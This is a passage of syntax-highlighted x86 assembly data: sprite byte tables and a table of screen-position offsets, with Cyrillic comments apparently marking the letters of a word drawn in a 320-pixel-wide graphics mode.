        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">

</span><span class="sc5">Spr2</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">

</span><span class="sc5">Cord</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">026</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">032</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">036</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">026</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">032</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">036</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">026</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">032</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 5</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">058</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">055</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">061</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">052</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">064</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">049</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">067</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">046</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">070</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;Л 5</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">092</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">089</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">095</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">086</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">098</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">083</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">089</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">095</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">101</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">080</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">104</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;А 5</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">119</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">125</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">114</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">014</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">014</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">114</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">114</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">026</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">130</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">026</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">119</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">125</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;С 5</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">147</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">153</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 1</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">142</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">158</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">015</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 2</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">142</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">158</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 3</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">142</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">158</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">025</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">147</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 5</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">153</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">030</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;О 5</span><span class="sc0">

        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">170</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">     </span><span class="sc1">;В 1</span><span class="sc0">
